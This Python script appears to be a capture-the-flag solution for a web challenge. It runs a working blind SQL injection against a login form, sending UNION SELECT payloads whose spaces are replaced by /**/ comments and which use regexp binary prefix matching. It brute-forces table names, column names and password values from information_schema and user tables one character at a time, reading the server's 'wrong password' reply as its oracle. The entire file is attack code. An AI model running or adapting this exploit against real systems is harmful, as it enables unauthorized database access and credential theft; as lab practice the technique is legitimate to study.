import requests
import string

headers = {
    'Host': 'h3.l1n3.net:20180',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
}

s = ""
a = ""
# for e in range(100):
#     for i in string.printable:
#         s = a + i
#         data = {
#             'user': "user='/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/binary/**/'^U{}".format(s),
#             #'user' : "'/**/union/**/select/**/1/**/from/**/web07/**/where/**/password/**/regexp/**/binary/**/'^{}".format(s),
#             #'user' : "'/**/union/**/select/**/1/**/from/**/member/**/where/**/password/**/regexp/**/binary/**/'^{}".format(s),
#             'pass': '123'
#         }
#         data['user'] += ".*$'#"
#         print(data['user'])
#         response = requests.post('http://h3.l1n3.net:20180/web07_5c2d/index.php', headers=headers, data=data)
#         if "密码错误" in (response.text):
#             a += i
#             print(a)
#             break

for i in string.printable:
    s = a + i
    data = {
        'user': "'/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/column_name/**/regexp/**/binary/**/'^us{}'#".format(i),
        #'user' : "'/**/union/**/select/**/1/**/from/**/web07/**/where/**/password/**/regexp/**/binary/**/'^{}".format(s),
        #'user' : "'/**/union/**/select/**/1/**/from/**/member/**/where/**/password/**/regexp/**/binary/**/'^3c9{}".format(s),
        'pass': '123'
    }
    #data['user'] += ".*$'#"
    print(data['user'])
    response = requests.post('http://h3.l1n3.net:20180/web07_5c2d/index.php', headers=headers, data=data)
    if "密码错误" in (response.text):
        a += i
        print(i)
